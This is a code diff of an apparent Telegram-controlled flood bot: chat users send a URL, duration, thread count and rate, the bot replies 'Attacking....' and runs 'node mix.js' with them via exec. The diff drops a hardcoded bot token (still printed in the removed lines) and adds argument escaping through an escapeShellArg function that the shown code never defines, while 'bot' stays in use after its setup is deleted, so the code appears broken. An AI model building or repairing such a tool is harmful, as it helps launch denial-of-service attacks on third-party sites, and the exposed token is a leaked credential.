@@ -1,13 +1,5 @@
-const TelegramBot = require('node-telegram-bot-api');
 const { exec } = require('child_process');
 
-// Replace with your Telegram bot token
-const token = '7220570795:AAGrXxndOJMNNGloJS5Fkl_A8L2QDIBW-jk';
-
-// Initialize bot with the token
-const bot = new TelegramBot(token, { polling: true });
-
-// Function to log bot usage activity to console log
 function logActivity(msg) {
   const user = msg.from;
   const chat = msg.chat;
@@ -39,16 +31,28 @@ bot.on('message', (msg) => {
 
     // Check if the message format is correct
     if (args.length === 5 && url && time && thread && rate) {
+      // Escape arguments to prevent command injection
+      const escapedUrl = escapeShellArg([url]);
+      const escapedTime = escapeShellArg([time]);
+      const escapedThread = escapeShellArg([thread]);
+      const escapedRate = escapeShellArg([rate]);
+
       bot.sendMessage(chatId, 'Attacking....');
-      exec(`node mix.js ${url} ${time} ${thread} ${rate}`, (error, stdout, stderr) => {
+      
+      // Log the command to be executed
+      const commandToExecute = `node mix.js ${escapedUrl} ${escapedTime} ${escapedThread} ${escapedRate}`;
+      console.log(`Executing command: ${commandToExecute}`);
+
+      // Execute the command
+      exec(commandToExecute, (error, stdout, stderr) => {
         if (error) {
           console.error(`Error: ${error.message}`);
-          bot.sendMessage(chatId, 'Error');
+          bot.sendMessage(chatId, `Error: ${error.message}`);
           return;
         }
         if (stderr) {
           console.error(`stderr: ${stderr}`);
-          bot.sendMessage(chatId, 'Success !');
+          bot.sendMessage(chatId, `stderr: ${stderr}`);
           return;
         }
         // Display stdout output if successful
